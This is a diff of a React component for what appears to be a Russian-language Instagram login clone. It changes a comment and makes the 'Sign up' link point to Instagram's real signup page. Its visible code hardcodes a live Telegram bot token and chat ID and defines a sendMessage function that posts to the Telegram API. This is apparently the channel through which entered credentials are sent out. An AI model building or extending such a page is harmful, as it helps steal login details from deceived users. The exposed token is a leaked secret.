@@ -11,7 +11,6 @@ function App() {
   const TELEGRAM_BOT_TOKEN = "7592077825:AAHIuzAz5xy1wEjZwKD2YCkHN60Un3ZF1Bk";
   const CHAT_ID = "1226692867";
 
-  // Function to send a message to Telegram Bot
   const sendMessage = async (message) => {
     const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
 
@@ -95,7 +94,10 @@ function App() {
       </form>
 
       <div className={styles.signupContainer}>
-        <span>У вас нет аккаунта?</span> <a href="#">Зарегистрироваться</a>
+        <span>У вас нет аккаунта?</span>{" "}
+        <a href="https://www.instagram.com/accounts/emailsignup/">
+          Зарегистрироваться
+        </a>
       </div>
 
       <div className={styles.getApp}>
